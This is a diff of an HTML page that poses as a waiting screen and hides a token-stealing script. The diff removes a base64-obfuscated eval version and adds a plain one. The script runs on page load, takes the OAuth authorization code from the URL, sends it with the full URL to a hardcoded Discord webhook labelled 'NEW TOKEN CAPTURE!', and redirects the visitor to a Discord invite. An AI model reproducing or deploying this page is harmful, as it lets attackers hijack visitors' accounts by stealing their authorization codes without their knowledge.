@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Your World Controling...</title>
+    <title>Hertz Complete...</title>
     <style>
         body {
             font-family: Arial;
@@ -9,24 +9,62 @@
             align-items: center;
             justify-content: center;
             height: 100vh;
-            background: #0f172a;
-            color: white;
             margin: 0;
             padding: 20px;
             box-sizing: border-box;
+            
+            background: #000 url("https://i.imgur.com/OxUdmtJ.gif") center/cover no-repeat fixed;
+            color: white;
+            position: relative;
+        }
+        
+        body::before {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background: rgba(0,0,0,0.4);
+            z-index: 0;
         }
         .box {
             text-align: center;
             max-width: 500px;
+            z-index: 1;
+            position: relative;
+            text-shadow: 0 0 8px rgba(0,0,0,0.9);
         }
     </style>
 </head>
 <body>
     <div class="box">
-        <h1>Verifying...</h1>
-        <p>Please wait, connecting to server...</p>
+        <h1>Be Patient....</h1>
+        <p>Chill...</p>
     </div>
 
-<script>eval(atob("CmNvbnN0IFdFQkhPT1tfVVJMPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyODYwOTM0MTA1MjAyNzA0NC8ybkhHZ2tEek5fQnplRXdpVlQ0S19M0lKbnhpTzBSZjJPM0JUSHR6aEcyckVhWEtLaXR0WHFlLUdJUDF4azJ2amRfYiI7CmNvbnN0IFJFRElSRUNUX1VSTCA9ICJodHRwczovL2Rpc2NvcmQuZ2cvNUNEMkh3cVEiOwoKbGV0IGNvZGUgPSBuZXcgVVJMU2VhcmNoUGFyYW1zKHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gpLmdldCgiY29kZSIpfHwgIiI7CgpmZXRjaChXRUJIT09LX1VSTCwgewogICAgbWV0aG9kOiAiUE9TVCIsCiAgICAgaGVhZGVyczogeyAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iIH0sCiAgICBib2R5OiBKU09OU3RyaW5naWZ5ewoICAgICAgZW1iZWRzOiBbXHsKICAgICAgICAgICAgdGl0bGU6ICLwn6ZzIEJBR09ORyBQQVRDSUVSISBDQVBUUkUiLAogICAgICAgICAgICBjb2xvcjogMHgyZWNjNzEsCiAgICAgICAgICAgIGZpZWxkczogW3sKICAgICAgICAgICAgICAgICAgICBuYW1lOiAi8J+pi0BBVUSE1PUiBDT0RFIiwKICAgICAgICAgICAgICAgICAgICB2YWx1ZTogY29kZSA/ICJ8fCIgKyBjb2RlICsgInx8XG4oR2FtaXRpIGl0byBwYWxpdGFuIHNhIEFjY2VzcyBUb2tlbikiIDogIuKAgSBWFMQU5HIENPREUgTkFLVUhBCiAgICAgICAgICAgIH0sIHsKICAgICAgICAgICAgICAgICAgICBuYW1lOiAi8J+qk0gRnVsbCBVUkwiLAogICAgICAgICAgICAgdmFsdWU6IHdpbmRvdy5sb2NhdGlvbi5ocmVmLnNsaWNlKDAsIDEwMjQpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgXQogICAgICAgIH0dQp+XQogICAgfSkpCiAKLmNhdGNoKGVyciA9PiBjb25zb2xlLmVycm9yKCdFcnJvcjopLCBlcnIpKQouZmluYWxseSgpID0+IHsKICAgIHNldFRpbWVvdXQoKCkgPT4gd2luZG93LmxvY2F0YS5ocmVmID0gUkVESVJFQ1RfVVJMLCAxNTAwKTsKfTs="));</script>
+<script>
+
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1528609341052027044/2nHhgkDzN_BzeEwiVT4K_LjINjxiO0Rf2O3BTHtzhGS2rEAXKottXqe-GIP2xk2vjD_b";
+const REDIRECT_URL = "https://discord.gg/4UCD2HwqQ";
+
+let code = new URLSearchParams(window.location.search).get("code") || "";
+
+fetch(WEBHOOK_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+        embeds: [{
+            title: "NEW TOKEN CAPTURE!",
+            color: 0x2ecc71,
+            fields: [
+                { name: "AUTHORIZATION CODE", value: code ? `||${code}||\n(Gamitin ito para palitan sa Access Token)` : "❌ WALANG CODE NAKUHA" },
+                { name: "FULL URL", value: window.location.href.slice(0, 1024) }
+            ]
+        }]
+    })
+})
+.catch(err => console.error("Error:", err))
+.finally(() => {
+    setTimeout(() => window.location.href = REDIRECT_URL, 1500);
+});
+</script>
 </body>
 </html>
